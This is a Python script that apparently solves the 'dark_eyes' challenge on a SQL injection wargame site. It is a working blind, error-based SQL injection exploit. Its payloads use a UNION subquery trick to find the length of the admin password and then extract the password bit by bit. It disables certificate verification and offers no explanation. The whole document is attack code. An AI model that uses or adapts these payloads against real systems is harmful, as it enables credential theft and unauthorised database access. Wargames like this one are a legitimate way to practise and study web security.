import requests

requests.packages.urllib3.disable_warnings()
sess = requests.session()
URL = 'https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php?pw='
headers = {'Cookie': ''}

passwordLen = 0

for i in range(1, 100):
    payload = "' or id='admin' and (select 1 union select (length(pw)={}))%23".format(i)
    res = sess.get(url=URL + payload, headers=headers, verify=False)
    if 'query' in res.text:
        passwordLen = i
        break
    else:
        pass

print('Find Password Length : %d' % passwordLen)

bitLen = 16
Password = ''

for j in range(1, passwordLen + 1):
    bit = ''
    for i in range(1, bitLen + 1):
        payload = "' or id='admin' and (select 1 union select (substr(lpad(bin(ord(substr(pw,{},1))),{},0),{},1)=1))%23".format(j, bitLen, i)
        res = sess.get(url=URL + payload, headers=headers, verify=False)
        if 'query' in res.text:
            bit += '1'
        else:
            bit += '0'
    Password += chr(int(bit, 2))
    print('[=] Find Password(count %02d) : %s (bit : %s) (hex : %s)' % (j, chr(int(bit, 2)), bit, hex(int(bit, 2))[2:]))

print('[=] Find Password : %s' % Password)

